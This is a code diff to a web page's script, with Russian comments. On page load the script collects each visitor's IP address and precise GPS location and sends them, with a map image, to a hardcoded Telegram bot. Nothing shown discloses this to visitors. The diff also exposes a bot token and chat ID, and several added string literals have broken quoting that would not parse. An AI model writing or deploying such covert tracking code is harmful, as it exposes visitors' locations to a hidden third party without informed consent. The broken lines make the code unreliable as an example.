@@ -35,11 +35,11 @@
     const TELEGRAM_BOT_TOKEN = '8894434630:AAFel26CV1rYtt1EtwLJVUuCMGf1U_QwCwY'; 
     const TELEGRAM_CHAT_ID = '8296850527';
 
-    // Функция отправки сообщения в Telegram
+    // Отправка текста в Telegram (если нужно)
     function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
-        fetch(url, {
+        return fetch(url, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -49,38 +49,78 @@
                 text: message,
                 parse_mode: 'Markdown'
             })
+        });
+    }
+
+    // Отправка фото (URL) в Telegram
+    function sendPhotoToTelegram(photoUrl, caption) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+        return fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                photo: photoUrl,
+                caption: caption,
+                parse_mode: 'Markdown'
+            })
         })
         .then(response => {
             if (!response.ok) {
-                console.error('Ошибка отправки в Telegram');
+                console.error('Ошибка отправки фото в Telegram');
             }
         })
         .catch(error => console.error('Ошибка сети:', error));
     }
 
+    // Получение IP
+    async function getClientIp() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch (e) {
+            console.error('Ошибка получения IP:', e);
+            return 'не удалось получить IP';
+        }
+    }
+
     // Запрос геолокации при загрузке страницы
-    window.addEventListener('load', () => {
+    window.addEventListener('load', async () => {
+        const userIp = await getClientIp();
+
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
-                // Если пользователь согласился поделиться геопозицией
-                (position) => {
+                async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const accuracy = position.coords.accuracy; // Точность в метрах
+                    const accuracy = position.coords.accuracy;
 
-                    // Ссылка на Google Карты с координатами
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                     
-                    const text = `📍 *Новый посетитель!*\n` +
-                                 `• Широта: \`${lat}\`\n` +
-                                 `• Долгота: \`${lon}\`\n` +
-                                 `• Точность: ~${Math.round(accuracy)} м.\n\n` +
-                                 `🔗 [Открыть на картах](${mapUrl})`;
+                    // Статическая карта на базе OpenStreetMap (без ключа)
+                    const staticMapUrl = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=15&size=600x400&markers=${lat},${lon},ol-marker`;
 
-                    sendToTelegram(text);
+                    const caption = `📍 *Новый посетитель!*
+` +
+                                    `• IP: `${userIp}`
+` +
+                                    `• Широта: `${lat}`
+` +
+                                    `• Долгота: `${lon}`
+` +
+                                    `• Точность: ~${Math.round(accuracy)} м.
+
+` +
+                                    `🔗 [Открыть на картах](${mapUrl})`;
+
+                    // Отправляем фото (карту) + подпись
+                    await sendPhotoToTelegram(staticMapUrl, caption);
                 },
-                // Если пользователь запретил доступ или произошла ошибка
-                (error) => {
+                async (error) => {
                     let errorMsg = '';
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
@@ -95,21 +135,29 @@
                         default:
                             errorMsg = 'Неизвестная ошибка при запросе геопозиции.';
                     }
-                    sendToTelegram(`⚠️ *Посетитель перешел на сайт, но:* \n${errorMsg}`);
+
+                    const text = `⚠️ *Посетитель перешел на сайт, но:* 
+${errorMsg}
+
+` +
+                                 `• IP: `${userIp}``;
+
+                    await sendToTelegram(text);
                 },
-                // Опции запроса геолокации
                 {
-                    enableHighAccuracy: true, // Запрашивать высокую точность (GPS при наличии)
-                    timeout: 10000,           // Таймаут 10 секунд
-                    maximumAge: 0             // Не использовать кэшированные данные
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
                 }
             );
         } else {
-            sendToTelegram('❌ Браузер пользователя не поддерживает Geolocation API.');
+            const text = '❌ Браузер пользователя не поддерживает Geolocation API.
+' +
+                         `• IP: `${userIp}``;
+            await sendToTelegram(text);
         }
     });
 </script>
 
 </body>
 </html>
-
